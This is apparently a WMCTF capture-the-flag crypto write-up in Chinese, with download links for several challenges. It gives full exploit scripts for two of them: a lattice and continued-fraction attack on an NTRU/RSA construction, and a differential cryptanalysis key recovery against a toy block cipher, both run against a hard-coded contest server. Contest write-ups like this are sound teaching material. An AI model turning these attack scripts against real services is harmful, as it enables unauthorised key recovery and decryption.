009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200030064000300830202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c00040004000400040004000400040037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c00040037001900030003009d0202000400470047006b020400370004001c001900030003009d0202000300190002000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200030064000300830202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000300830102000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200030064000300830202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200030083015300 
```
###  

# **Crypto：** 

## Game 

[https://share.weiyun.com/CYKXh62K](https://share.weiyun.com/CYKXh62K)

[https://mega.nz/file/jKwU3A6K#X0BNI_0wiUdLNtUYNoInvAUq1orrxHr9L_fFFfL28wk](https://mega.nz/file/jKwU3A6K#X0BNI_0wiUdLNtUYNoInvAUq1orrxHr9L_fFFfL28wk)

## Sum 

[https://share.weiyun.com/R7ndcx3f](https://share.weiyun.com/R7ndcx3f)

[https://mega.nz/file/vb4GSYqD#nwgsTklaA_Fhy0VXqYz8mcLUQ3DIwWmoGlXKjIzt5fA](https://mega.nz/file/vb4GSYqD#nwgsTklaA_Fhy0VXqYz8mcLUQ3DIwWmoGlXKjIzt5fA)

## babySum 

[https://share.weiyun.com/QSysa7lU](https://share.weiyun.com/QSysa7lU)

[https://mega.nz/file/mDx2iQDa#lUdyHj552B0DM37yK29etDzwZMLLq0k-xSTz3yF0E7M](https://mega.nz/file/mDx2iQDa#lUdyHj552B0DM37yK29etDzwZMLLq0k-xSTz3yF0E7M)

 

## piece_of_cake 

**非预期** ： 

对于 eat_cake()，已知 cake.bit_length()，那么直接规约出 **等价** f, g，获取 cake%g 即可。 

**预期** ： 

task.py 中有两个函数，make_cake() 和 eat_cake()，两函数中都有类NTRU二阶和RSA加密，但细看会发现有区别：make_cake() 的比特关系使得 cake 能被求出，而 eat_cake() 不行；其最后输出的 $ct=  cake^k\ mod\ N$ 的指数也有所不同。通过开头的 assert 可以感知到本题与格基规约相关。综合以上几点我们能够推断出做题流程：我们通过不断 make_cake() 拿到 $d_i$ 后使用 LLL 求出 $e$ ，再eat_cake()，通过 $gcd( (x^{ed-1}-1)\ mod\ N, N)$ 分解 N 后拿到 flag。 

很明显这里通过 $f, g, q$ 的关系可以看出，使用 wiener's attack 是可以求出包含 $f$ (即 $d$) 的一个集合的。在 make_cake() 中，拿到 cake 后通过 $pow(cake, d, N)$ 可以确定这个 $d$。根据 e 和 N 的关系，获取 14 组 d 后则可构造论文 [Lattice Based Attack on Common Private Exponent RSA](https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf)中的格子拿到 e。而后以 eat_cake() 中所有 d 的候选对 N 进行分解后拿到 cake，即可获取 flag。 

exp 如下: 

```python
from Crypto.Util.number import * 
from gmpy2 import invert, sqrt, gcd 
from string import ascii_letters, digits 
from hashlib import sha256 
from pwn import * 
from pwnlib.util.iters import mbruteforce 
context.log_level = 'debug' 
def proof_of_work(p): 
    p.recvuntil("XXX+") 
    suffix = p.recv(17).decode("utf8") 
    p.recvuntil("== ") 
    cipher = p.recvline().strip().decode("utf8") 
    proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == 
                        cipher, string.ascii_letters + string.digits, length=3, method='fixed') 
    p.sendlineafter("Give me XXX:", proof) 
def rational_to_contfrac(x,y): 
    a = x // y 
    pquotients = [a] 
    while a * y != x: 
        x,y = y, x - a * y 
        a = x // y 
        pquotients.append(a) 
    return pquotients 
def convergents_from_contfrac(frac): 
    convs = [] 
    for i in range(len(frac)): 
        convs.append(contfrac_to_rational(frac[0:i])) 
    return convs 
def contfrac_to_rational (frac): 
    if len(frac) == 0: 
        return (0, 1) 
    num = frac[-1] 
    denom = 1 
    for _ in range(-2, -len(frac) - 1, -1): 
        num, denom = frac[_] * num + denom, num 
    return (num, denom) 
def get_d(q, h, c, N, ct): 
    frac = rational_to_contfrac(h, q) 
    convergents = convergents_from_contfrac(frac) 
    for (i, f) in convergents: 
        g = abs(h * f - i * q) 
        try: 
            cake = (c * f % q * invert(f, g) % g) 
            if pow(cake, f, N) == ct: 
                return f 
        except: 
            continue 
def make_cake(): 
    Ns = [] 
    ds = [] 
    num = 14 
    for i in range(num): 
        print("Getting the {} / {} d".format(str(i + 1), str(num))) 
        io = remote('202.115.22.200', 8631) 
        proof_of_work(io) 
        io.sendafter('What\'s your choice?\n', '2\n') 
        io.recvline() 
        q, h, c = [int(x) for x in io.recvline(keepends = False).decode().split(' ')] 
        N = int(io.recvline(keepends = False)) 
        Ns.append(N) 
        ds.append(get_d(q, h, c, N, int(io.recvline(keepends = False)))) 
        io.close() 
    M = 1 
    for i in range(num): 
        if int(sqrt(Ns[i])) > M: 
            M = int(sqrt(Ns[i])) 
    B = matrix(ZZ, num + 1, num + 1) 
    B[0, 0] = M 
    for i in range(1, num + 1): 
        B[0, i] = ds[i - 1] 
    for i in range(1, num + 1): 
        B[i, i] = -Ns[i - 1] 
    return abs(B.LLL()[0, 0] // M) 
def get_ans(q,h,e, N, ct): 
    frac = rational_to_contfrac(h, q) 
    convergents = convergents_from_contfrac(frac) 
    for (i, d) in convergents: 
        p = gcd(int(pow(2, e * d - 1,N) - 1), N) 
        if p > 1 and p < N: 
            return pow(ct, invert(0x10001, (p - 1) * (N//p - 1)), N) 
def eat_cake(e): 
    io = remote('202.115.22.200', 8631) 
    proof_of_work(io) 
    io.sendafter('What\'s your choice?\n', '1\n') 
    io.recvline() 
    q, h, c = [int(x) for x in io.recvline(keepends = False).decode().split(' ')] 
    N = int(io.recvline(keepends = False)) 
    ct = int(io.recvline(keepends = False)) 
    ans = get_ans(q ,h , e, N, ct) 
    io.recvuntil("Give me your cake:") 
    io.sendline(str(ans)) 
    io.interactive() 
    io.close() 
e = make_cake() 
eat_cake(e) 
```
 
## idiot box 

静态数据给出了8个具有特殊结构的S盒（很蠢），对其求差分分布可发现， 

在输入差分为 ![图片](https://uploader.shimo.im/f/VHgQdnJQoP0SNKVZ.png!thumbnail)形式时，均存在一 ![图片](https://uploader.shimo.im/f/1GdJ6DlY3NUmZOBM.png!thumbnail)，使得该输入差分对应输出差分0000的概率为 ![图片](https://uploader.shimo.im/f/BViZXvpKjjKJpWZb.png!thumbnail)

且S盒六进四出，非双射关系，因此可以找到8条两轮迭代高概率差分特征（分别对应激活8个S盒） 

进而得到 ![图片](https://uploader.shimo.im/f/PbvpAAmfQEoanQGB.png!thumbnail)的五轮差分特征，采用八次 **1-R差分分析** 即可得到，第六轮子密钥对应每个S盒的分段密钥，最后通过逆向密钥扩展算法进行解密 

ps：正常的六进四出S盒，不存在仅单个S盒的二轮迭代非零差分特征，因为由E扩展函数知，该迭代差分特征要求输入差分为 ![图片](https://uploader.shimo.im/f/YgUXBaNDVrKfabuy.png!thumbnail)（即明文对处于同行），所以不可能存在满足该差分输入的明文对同时满足差分输出为0 

若对相邻两个S盒作二轮迭代差分特征，二者信噪比均在1左右（参数c约取20），但后者要求的明文对数量m=c/p在服务器上选择明文攻击耗时会过长，因此采用前者，题目挂载阿里云测试exp总耗时25min左右 

```python
import sys 
import itertools 
from tqdm import tqdm 
from binascii import hexlify, unhexlify 
from Crypto.Util.number import bytes_to_long, long_to_bytes 
from pwn import * 
ip, port = sys.argv[1], sys.argv[2] 
sbox = [[11, 10, 1, 3, 8, 3, 14, 13, 0, 3, 9, 2, 4, 2, 11, 4, 6, 1, 6, 13, 6, 7, 7, 0, 10, 5, 4, 5, 9, 5, 10, 10, 6, 7, 15, 4, 7, 9, 15, 12, 1, 15, 14, 11, 14, 13, 1, 13, 8, 8, 9, 2, 12, 2, 0, 12, 8, 3, 0, 15, 11, 12, 5, 14], [0, 15, 2, 8, 3, 8, 12, 12, 9, 10, 14, 13, 4, 13, 14, 14, 2, 1, 15, 1, 1, 7, 3, 1, 10, 15, 6, 4, 6, 8, 5, 15, 4, 5, 7, 11, 7, 2, 5, 9, 11, 7, 11, 14, 6, 2, 11, 3, 12, 13, 9, 3, 9, 12, 4, 8, 10, 0, 5, 0, 0, 10, 6, 13], [5, 10, 3, 12, 3, 0, 6, 15, 13, 2, 0, 15, 8, 2, 3, 13, 9, 11, 0, 6, 14, 11, 2, 10, 1, 4, 12, 1, 7, 4, 7, 15, 5, 8, 7, 12, 5, 11, 0, 12, 14, 6, 9, 8, 14, 6, 9, 3, 4, 10, 1, 2, 10, 8, 7, 13, 15, 13, 4, 1, 5, 9, 14, 11], [4, 0, 7, 7, 7, 5, 4, 1, 10, 12, 11, 11, 11, 10, 15, 3, 12, 8, 3, 0, 2, 14, 14, 13, 2, 10, 6, 4, 6, 10, 2, 3, 14, 15, 8, 15, 9, 1, 11, 7, 5, 5, 6, 13, 6, 8, 0, 1, 3, 14, 0, 2, 9, 15, 8, 12, 1, 4, 9, 13, 9, 13, 5, 12], [ 
    9, 10, 3, 4, 2, 10, 12, 4, 5, 12, 5, 11, 5, 9, 13, 10, 7, 11, 7, 11, 1, 3, 2, 3, 3, 7, 1, 5, 15, 13, 9, 7, 12, 8, 8, 15, 0, 6, 0, 14, 15, 8, 8, 1, 0, 1, 0, 10, 14, 2, 14, 9, 13, 11, 6, 12, 15, 13, 14, 6, 4, 6, 4, 2], [0, 8, 12, 15, 0, 8, 3, 6, 7, 15, 9, 9, 2, 15, 9, 9, 1, 12, 13, 10, 5, 10, 12, 14, 5, 7, 14, 6, 4, 7, 5, 2, 1, 6, 4, 12, 0, 1, 14, 4, 3, 13, 11, 7, 3, 6, 11, 10, 1, 14, 2, 13, 13, 8, 15, 11, 11, 0, 5, 10, 2, 4, 8, 3], [9, 15, 3, 1, 15, 1, 7, 15, 10, 4, 0, 1, 0, 0, 3, 6, 9, 10, 12, 3, 3, 1, 12, 7, 8, 5, 2, 14, 2, 9, 2, 14, 6, 12, 13, 10, 11, 13, 9, 8, 6, 8, 5, 4, 11, 8, 14, 4, 12, 7, 13, 2, 10, 7, 13, 14, 6, 5, 5, 11, 4, 0, 15, 11], [13, 3, 1, 7, 1, 12, 10, 3, 14, 12, 14, 7, 10, 15, 5, 0, 2, 4, 13, 4, 13, 0, 8, 9, 11, 9, 10, 15, 3, 9, 12, 9, 11, 2, 8, 6, 10, 14, 11, 6, 2, 0, 6, 15, 12, 15, 6, 14, 7, 4, 13, 11, 0, 4, 7, 3, 2, 5, 1, 1, 5, 8, 8, 5]] 
pbox = [19, 14, 15, 3, 10, 25, 26, 20, 23, 24, 7, 2, 18, 6, 30, 
        29, 1, 4, 9, 8, 27, 5, 13, 0, 21, 16, 17, 22, 12, 31, 11, 28] 
dif_dist, cipher = None, None 
pc_key = [2, 13, 16, 37, 34, 32, 21, 29, 15, 25, 44, 42, 18, 35, 5, 38, 39, 12, 30, 11, 7, 20, 
          17, 22, 14, 10, 26, 1, 33, 46, 45, 6, 40, 41, 43, 24, 9, 47, 4, 0, 19, 28, 27, 3, 31, 36, 8, 23] 
inv_pc_key = [pc_key.index(i) for i in range(48)] 

def get_data(): 
    global cipher 
    io = remote(ip, port) 
    io.recvuntil('FLAG') 
    io.recvline() 
    cipher = io.recvline().strip() 
    print(cipher) 
    io.recvuntil('input') 
    io.recvline() 
    return io 

def enc(io, pt): 
    pt_hex = hex(pt)[2:].rjust(16, '0') 
    io.sendline(pt_hex) 
    ct_hex = io.recvline() 
    ct = int(ct_hex, 16) 
    return io, ct 

def s(x, i): 
    row = ((x & 0b100000) >> 4) + (x & 1) 
    col = (x & 0b011110) >> 1 
    return sbox[i][(row << 4) + col] 

def p(x): 
    x_bin = [int(_) for _ in bin(x)[2:].rjust(32, '0')] 
    y_bin = [x_bin[pbox[i]] for i in range(32)] 
    y = int(''.join([str(_) for _ in y_bin]), 2) 
    return y 

def e(x): 
    x_bin = bin(x)[2:].rjust(32, '0') 
    y_bin = '' 
    idx = -1 
    for i in range(8): 
        for j in range(idx, idx + 6): 
            y_bin += x_bin[j % 32] 
        idx += 4 
    return int(y_bin, 2) 

def inv_e(x_in): 
    x_in = bin(x_in)[2:].rjust(48, '0') 
    x = '' 
    for i in range(0, 48, 6): 
        x += x_in[i+1:i+5] 
    x = int(x, 2) 
    return x 

def F(x, k): 
    x_in = bin(e(x) ^ k)[2:].rjust(48, '0') 
    y_out = '' 
    for i in range(0, 48, 6): 
        x_in_i = int(x_in[i:i+6], 2) 
        y_out += bin(s(x_in_i, i // 6))[2:].rjust(4, '0') 
    y_out = int(y_out, 2) 
    y = p(y_out) 
    return y 
# sub_key(bin_str) has 48-bits 

def dec_block(y, sub_key): 
    y_bin = bin(y)[2:].rjust(64, '0') 
    l, r = int(y_bin[:32], 2), int(y_bin[32:], 2) 
    for i in range(6): 
        l, r = r, l ^ F(r, int(sub_key, 2)) 
        sub_key = ''.join([sub_key[inv_pc_key[j]] for j in range(48)]) 
    x = (l + (r << 32)) & ((1 << 64) - 1) 
    return x 

def dec(ct, sub_key): 
    assert(len(ct) % 8 == 0) 
    pt = b'' 
    for i in range(0, len(ct), 8): 
        pt_block = long_to_bytes( 
            dec_block(bytes_to_long(ct[i:i+8]), sub_key)).rjust(8, b'\x00') 
        pt += pt_block 
    return pt 
# Differential distribution 

def gen_dif_dist(): 
    global dif_dist 
    dif_dist = [] 
    keys = list(itertools.product(range(64), repeat=2)) 
    for i in range(8): 
        dif_dist_i = dict() 
        for key in keys: 
            dif_dist_i[key] = 0 
        for (x, x_ast) in keys: 
            x_dif = (x ^ x_ast) & 0b111111 
            y_dif = (s(x, i) ^ s(x_ast, i)) & 0b1111 
            dif_dist_i[(x_dif, y_dif)] += 1 
        dif_dist.append(dif_dist_i) 
# Find 2-round iterative features (sbox[idx]) 

def find_path(idx): 
    max_pro = 0 
    path = None 
    for i in range(1, 4): 
        value = dif_dist[idx][(i << 2, 0)] 
        if value > max_pro: 
            max_pro = value 
            path = i << 2 
    return path, max_pro 
# Get input_dif corresponding to the path found 

def input_dif(path, idx): 
    x_in = '0' * idx * 6 + bin(path)[2:].rjust(6, '0') + '0' * (7 - idx) * 6 
    x = inv_e(int(x_in, 2)) 
    return (x << 32) 
# Filter wrong pairs 

def filter_pair(pt_dif, idx, io): 
    filt = hex(pt_dif)[2:].rjust(16, '0')[:8] 
    cts = [] 
    i_shift = 60 - idx * 4 
    j_shift = (i_shift - 4) % 32 + 32 
    k_shift = (i_shift + 4) % 32 + 32 
    for i in tqdm(range(2**4)): 
        for j in range(2**4): 
            for k in range(2**4): 
                pt = (i << i_shift) + (j << j_shift) + (k << k_shift) 
                pt_ast = pt ^ pt_dif 
                io, ct = enc(io, pt) 
                io, ct_ast = enc(io, pt_ast) 
                ct_dif = ct ^ ct_ast 
                if hex(ct_dif)[2:].rjust(16, '0')[8:] == filt: 
                    cts.append((ct, ct_ast)) 
    return cts, io 
# Find satisfied dif-features 

def gen_features(idx, io): 
    path, max_pro = find_path(idx) 
    # print((path, max_pro)) 
    pt_dif = input_dif(path, idx) 
    # print(hex(pt_dif)[2:].rjust(16, '0')) 
    cts, io = filter_pair(pt_dif, idx, io) 
    return cts, max_pro, io 

def crack_part_key(cts, idx, m): 
    sub_key = [0] * (2**6) 
    if len(cts) > m: 
        cts = cts[len(cts)//2-m//2:len(cts)//2+m//2] 
    for (ct, ct_ast) in tqdm(cts): 
        ctl = ct >> 32 
        ctr = ct & ((1 << 32) - 1) 
        ctl_ast = ct_ast >> 32 
        ctr_ast = ct_ast & ((1 << 32) - 1) 
        for i in range(2**6): 
            pro_key = i << (42 - 6 * idx) 
            if (F(ctr, pro_key) ^ F(ctr_ast, pro_key) ^ ctl ^ ctl_ast) == 0: 
                sub_key[i] += 1 
    corr_num = max(sub_key) 
    pro_part_key = [] 
    for i in range(2**6): 
        if sub_key[i] == corr_num: 
            pro_part_key.append(i) 
    return pro_part_key 

def crack_key(io): 
    pro_key = [] 
    for i in range(8): 
        print('[+] cracking {}/8'.format(i + 1)) 
        cts, max_pro, io = gen_features(i, io) 
        #c = 20 
        #m = (c * 64 * 64) // (max_pro ** 2) 
        pro_part_key = crack_part_key(cts, i, 320) 
        pro_key.append(pro_part_key) 
    io.close() 
    return pro_key 

def get_flag(pro_key): 
    flag = None 
    ct = unhexlify(cipher) 
    sub_key = list(itertools.product( 
        pro_key[0], pro_key[1], pro_key[2], pro_key[3], pro_key[4], pro_key[5], pro_key[6], pro_key[7])) 
    for i in range(len(sub_key)): 
        sk = 0 
        for j in range(8): 
            sk += (sub_key[i][j] << (42 - 6 * j)) 
        sub_key[i] = bin(sk)[2:].rjust(48, '0') 
    for sk in tqdm(sub_key): 
        pt = dec(ct, sk) 
        if b'WMCTF' in pt: 
            print(pt) 
            flag = pt 
            break 
    return flag 

if __name__ == '__main__': 
    io = get_data() 
    gen_dif_dist() 
    pro_key = crack_key(io) 
    print(pro_key) 
    flag = get_flag(pro_key) 
    print(flag) 
```
 
